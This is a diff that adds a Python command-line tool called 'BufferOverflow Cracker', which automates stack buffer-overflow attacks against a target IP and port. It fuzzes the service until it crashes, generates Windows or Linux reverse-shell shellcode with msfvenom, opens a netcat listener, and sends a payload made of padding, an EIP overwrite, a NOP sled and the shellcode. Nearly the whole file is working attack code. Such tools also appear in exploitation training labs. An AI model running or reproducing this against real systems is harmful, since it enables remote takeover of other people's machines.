@@ -1,0 +1,180 @@
+import socket
+from colorama import Fore
+import time
+import os
+import re
+
+#COLORS
+green = Fore.GREEN
+red = Fore.RED
+yellow = Fore.YELLOW
+reset = Fore.RESET
+cyan = Fore.CYAN
+
+suffix = b""
+prefix = b""
+
+ip = ""
+port = 0
+packages_break = ""
+CHAR_SIZE = 0
+localport = 0
+packages_size = 0
+nop = 0
+bytes_limit = 0
+eip = b"BBBB"
+payload = b""
+localhost = ""
+badchars = "\\x00"
+final_package = ""
+print(f"{green}HEY USER!\n{yellow}$eip={eip}\n$ip={ip}\n$port={port}\n$bytes_limit={bytes_limit}\n$payload={payload}\n$nop={nop}\n$localhost={localhost}\n$badchars={badchars}\n$localport={localport}\n\n{red}$suffix={suffix}\n$prefix={prefix}{reset}")
+while True:
+    command = input(f"{cyan}Command  >>  {reset}")
+    if command == "help":
+        print("COMANDS")
+    elif command == "exploit":
+        if input(f"Do you have a listener on? (Y/n)  >>  {reset}").lower() == "y":
+                try:
+                    connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    connect.settimeout(10)
+                    connect.connect((ip, port))
+                    final_package = prefix + b"A" * int(bytes_limit) + eip + (b"\x90" * nop) + payload + suffix
+                    print(final_package)
+                    connect.send(final_package)
+                    connect.close()
+                except Exception as e:
+                    print(f"ERROR SENDING DATA!{reset} {e}")
+        else:
+            pass
+    elif command == "vars":
+        print(f"{yellow}$eip={eip}\n$ip={ip}\n$port={port}\n$bytes_limit={bytes_limit}\n$payload={payload}\n$nop={nop}\n$localhost={localhost}\n$badchars={badchars}\n$localport={localport}\n\n{red}$suffix={suffix}\n$prefix={prefix}{reset}")
+    elif command == "clear":
+        os.system("clear")
+        print(f"{green}HEY USER!\n{yellow}$eip={eip}\n$ip={ip}\n$port={port}\n$bytes_limit={bytes_limit}\n$payload={payload}\n$nop={nop}\n$localhost={localhost}\n$badchars={badchars}\n$localport={localport}\n\n{red}$suffix={suffix}\n$prefix={prefix}{reset}")
+    elif command == "listen":
+        os.system(f"sudo gnome-terminal -- sh -c 'nc -lvp 4444;bash'")
+    elif "create badchars" in command:
+        try:
+            remove = command.split(' ')[2]
+            remove = remove.strip().replace(" ", "").split("\\x")
+            remove = [int(b, 16) for b in remove if b != ""]
+            payload = b""
+            for i in range(256):
+                if i not in remove:
+                    payload += bytes([i])
+        except:
+            print(f"{red}ERROR{reset}")
+    elif command == "pattern":
+        os.system(f'/usr/bin/msf-pattern_create -l {bytes_limit + 400} > bytearray')
+        payload = open('bytearray', 'r').read()
+        payload = bytes(payload, 'latin1')
+
+
+    #VARS CONTROL
+    elif "$suffix =" in command or "$suffix=" in command:
+        suffix = command.split('=')[1]
+        suffix = bytes(suffix, encoding="latin-1")
+        print(f"{yellow}{suffix}{reset}")
+    elif "$prefix =" in command or "$prefix=" in command:
+        prefix = command.split('=')[1]
+        prefix = bytes(prefix, encoding="latin-1")
+        print(f"{yellow}{prefix}{reset}")
+    elif "$ip =" in command or "$ip=" in command:
+        ip = command.split('=')[1].replace(' ', '')
+        print(f"{yellow}{ip}{reset}")
+    elif "$port =" in command or "$port=" in command:
+        port = int(command.split('=')[1].replace(' ', ''))
+        print(f"{yellow}{port}{reset}")
+    elif "$nop =" in command or "$nop=" in command:
+        nop = int(command.split('=')[1].replace(' ', ''))
+        print(f"{yellow}{nop}{reset}")
+    elif "$localport =" in command or "$localport=" in command:
+        localport = int(command.split('=')[1].replace(' ', ''))
+        print(f"{yellow}{localport}{reset}")
+    elif "$payload =" in command or "$payload=" in command:
+        payload = command.split('=')[1]
+        payload = bytes(payload, encoding="latin-1")
+        print(f"{yellow}{payload}{reset}")
+    elif "$eip =" in command or "$eip=" in command:
+        eip = str(command.split('=')[1].replace(' ',''))
+        eip = bytes(eip, encoding="latin-1")
+        print(f"{yellow}{eip}{reset}")
+    elif "$badchars =" in command or "&badchars=" in command:
+        badchars = str(command.split('=')[1].replace(' ',''))
+        badchars = bytes(badchars, encoding="latin-1")
+        print(f"{yellow}{badchars}{reset}")
+    elif "$localhost =" in command or "&localhost=" in command:
+        localhost = str(command.split('=')[1].replace(' ',''))
+        print(f"{yellow}{localhost}{reset}")
+    elif "$bytes_limit =" in command or "&bytes_limit=" in command:
+        bytes_limit = str(command.split('=')[1].replace(' ',''))
+        print(f"{yellow}{bytes_limit}{reset}")
+    elif command == "create payload":
+        if localhost != '' and localport != 0 and badchars != '':
+            print(f"DATA: localhost:{localhost}\nlocalport:{localport}\nbadchars:{badchars} {reset}")
+            operating_system = input(f"WHAT IS THE OS? L / W (Linux or Windows)?  >>   {reset}").lower()
+            if operating_system == "w":
+                print(f"{green}WINDOWS SELECTED!\n{yellow}Generating... {reset}")
+                os.system(f'''sudo msfvenom -p windows/shell_reverse_tcp LHOST={localhost} LPORT={localport} EXITFUNC=thread -b "{badchars}" -f python > PAYLOAD_{operating_system}_{ip}''')
+                content = open(f'PAYLOAD_{operating_system}_{ip}', 'r').read()
+                bytes_hex = re.findall(r'b"(.*?)"', content)
+                payload = ''.join(bytes_hex)
+                payload = payload.encode('latin1').decode('unicode_escape').encode('latin1')
+                payload = payload
+                print(f"{green}+Payload Generated: {payload}")
+            elif operating_system == 'l':
+                print(f"{green}LINUX SELECTED!\n{yellow}Generating... {reset}")
+                os.system(f'''sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST={localhost} LPORT={localport} EXITFUNC=thread -b "{badchars}" -f python > PAYLOAD_{operating_system}_{ip}''')
+                content = open(f'PAYLOAD_{operating_system}_{ip}', 'r').read()
+                bytes_hex = re.findall(r'b"(.*?)"', content)
+                payload = ''.join(bytes_hex)
+                payload = payload.encode('latin1').decode('unicode_escape').encode('latin1')
+                payload = payload
+                print(f"{green}+Payload Generated: {payload}")
+            else:
+                print(f"{red}NO OPERATING SYSTEM SPECIFIED {reset}")
+        else:
+            print(f"{red}Error, there are some variables not specified. Try the command 'vars' to see {reset}")
+    elif command == "final":
+        print(prefix + b"A" * int(bytes_limit) + eip + (b"\x90" * nop) + payload + suffix)
+    elif command == "exit" or command == "quit":
+        print(f"Thanks by using BufferOverflow Cracker! {reset}")
+        exit()
+    elif command == "set eip":
+        eip = input(f"{yellow}Memory EIP or other value (EX:0x311712f3)  >>   {reset}")
+        eip = eip.replace('0x', '')
+        eip = eip[6:8] + eip[4:6] + eip[2:4] + eip[0:2]
+        eip = bytes.fromhex(eip)
+    elif command == "simple connection":
+        os.system(f'gnome-terminal -- sh -c \'nc {ip} {port}; bash\'')
+    elif "break" == command:
+        if ip != "" and port != 0:
+            packages_size = int(input(f"{yellow}PACKAGES BY CONNECTION  >>  {reset}"))
+            start_size = int(input(f"{yellow}Start fuzzing with how many bytes?(EX: 10 -> 10,11,12,13...)  >>   {reset}"))
+            print(f"{green}+Trying to break application! {reset}")
+            while True:
+                try:
+                    connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    connect.settimeout(2)
+                    connect.connect((ip, port))
+                    print(f"{green}+Trying{reset}", CHAR_SIZE + start_size)
+                    packages_break = prefix + b"A" * start_size + b"A" * CHAR_SIZE + eip
+                    connect.send(packages_break)
+                    connect.recv(1024)
+                    CHAR_SIZE += packages_size
+                except Exception as e:
+                    connect.close()
+                    bytes_limit = CHAR_SIZE
+                    print(f"{red}COULDN'T CONNECT (possible buffer overflow!)\nBYTES: ", CHAR_SIZE + start_size, f"------------------------------------\nSETTING $bytes_limit to  {reset}", bytes_limit + start_size)
+                    print(e)
+                    packages_break = ""
+                    CHAR_SIZE = 0
+                    break
+
+        else:
+            print(f"{red}IP or PORT not set! use:\n$ip = IP\nand\n$port = PORT {reset}")
+    else:
+        print(f"{red}COMMAND NOT FOUND! {reset}")
+
+    
+    
